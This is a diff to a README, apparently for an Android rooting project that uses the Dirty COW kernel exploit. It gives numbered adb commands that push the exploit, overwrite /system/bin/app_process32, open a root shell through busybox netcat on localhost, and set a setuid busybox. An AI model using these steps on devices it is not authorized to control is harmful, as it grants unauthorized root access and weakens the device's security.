@@ -35,23 +35,40 @@ should have built binaries in the output folder, that you built.
 USEAGE outside of using the scripts:
 
 1: adb push dirtycow /data/local/tmp/dirtycow
+
 2: adb push recowvery-app_process32 /data/local/tmp/recowvery-app_process32
+
 ***** used busybox that was prebilt and did not include busybox.c , you can find git that has busybox.c and build if desired*******
 3: adb push busybox /data/local/tmp/busybox
+
 4: adb shell chmod 0777 /data/local/tmp/*
+
 5: adb shell /data/local/tmp/dirtycow /system/bin/app_process32 /data/local/tmp/recowvery-app_process32
 *** after dirty cow finishes wait about 1 minute, phone is expected to soft reboot and buttons and screen become non responsive, while adb remain connected.
+
 6: adb shell
+
 7: /data/local/tmp/busybox nc localhost 11112
 *** this should open a promtless shell with root access, you see cpio and no cuser. You can type and see your entry
+
 8: mkdir /data/local/test     
+
 9: /system/bin/chmod 0777 /data/local/test
+
 10: ls -l /data/local
+
 11: cp /data/local/tmp/busybox /data/local/test/busybox
+
 12: /system/bin/chmod 0777 /data/local/test/busybox
+
 13: ls -l /data/local/test                                  
+
 14: /system/bin/chmod +s /data/local/test/busybox           
+
 15: ls -l /data/local/test                                  shows can chmod files that are owned by root                                 
+
 16: whoami                                                  shows the id of shell (root)
+
 17: pwd                                                     shows the current dir
+
 18: exit
